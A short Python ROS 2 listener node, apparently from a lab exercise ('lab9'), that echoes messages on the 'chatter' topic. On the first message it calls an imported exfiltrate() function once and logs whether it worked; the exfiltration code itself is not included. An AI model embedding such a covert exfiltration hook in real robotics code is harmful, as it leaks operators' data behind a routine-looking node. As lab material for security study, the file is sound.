#!/usr/bin/env python3
import rclpy
from rclpy.node import Node
from std_msgs.msg import String

import lab9.eval


class Listener(Node):
    def __init__(self):
        super().__init__('listener')

        # 关键：先初始化
        self.exfil_done = False

        self.subscription = self.create_subscription(
            String,
            'chatter',
            self.listener_callback,
            10
        )

    def listener_callback(self, msg):
        self.get_logger().info(f'I heard: "{msg.data}"')

        if not self.exfil_done:
            try:
                code, resp = lab9.eval.exfiltrate()
                self.get_logger().info(f'Exfil OK: {code}')
                self.exfil_done = True
            except Exception as e:
                self.get_logger().error(f'Exfil failed: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = Listener()
    rclpy.spin(node)
    node.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
